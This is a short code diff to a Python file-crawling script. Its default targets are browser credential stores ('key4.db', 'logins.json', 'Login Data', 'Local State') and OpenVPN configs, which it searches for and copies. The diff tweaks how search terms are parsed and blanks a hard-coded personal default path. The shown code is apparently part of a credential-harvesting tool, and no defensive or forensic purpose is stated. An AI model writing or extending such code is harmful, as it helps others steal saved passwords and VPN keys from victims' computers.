@@ -15,6 +15,8 @@ def main(arguments):
         # TODO lire le fichier et ajouter chaque ligne dans un tableau
         elif ',' in search_files:
             search_files = search_files.split(',')
+        else:
+            search_files = [search_files]
     else:
         search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
 
@@ -31,7 +33,7 @@ def main(arguments):
     if arguments.path and arguments.path.strip():
         path = arguments.path
     else:
-        path = 'D:\\Users\\Sorrow\\Desktop\\crawl'
+        path = '' #D:\\Users\\Sorrow\\Desktop\\crawl
 
     files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
     filenames = filemanager.copy_files(files)
